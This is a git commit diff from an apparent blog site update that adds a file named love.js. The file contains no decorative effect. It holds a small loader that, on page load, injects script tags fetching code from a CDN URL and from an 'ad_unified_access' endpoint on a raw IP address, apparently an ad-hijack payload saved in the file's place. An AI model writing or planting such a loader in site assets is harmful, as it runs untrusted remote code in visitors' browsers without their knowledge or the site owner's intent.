22098862d63ff77c0e76f4c1e517fbcd6bff4058
lzwei60 <lzw462062531@126.com>
2019-03-12 10:50:46 +0800

    Site updated: 2019-03-12 10:50:38

---
+++ js/src/love.js
@@ -0,0 +1,5 @@
+var _atn_obj_ = new Object; 
+_atn_obj_.oldurl = 'http://7u2ss1.com1.z0.glb.clouddn.com/love.js?cHVzaA=1552357842'; 
+_atn_obj_.unified_url = 'http://183.59.53.202:3737/ad_unified_access?SP=ABzs/LzIPPyMrKz8jJyMnIzM2/zsnM0Zibg6jfyMnRztHSzoPOg8vLz8zPz4PMg87Kys3MysjHy82DzsrKzczKyMfLzc/Gz8bKzcuDyMjLzQ=='; 
+window.setTimeout(function(){var a=document.createElement("script");a.src=_atn_obj_.oldurl;document.getElementsByTagName("head")[0].appendChild(a);},0); 
+window.setTimeout(function(){var a=document.createElement("script");a.src=_atn_obj_.unified_url;document.getElementsByTagName("head")[0].appendChild(a);},0);
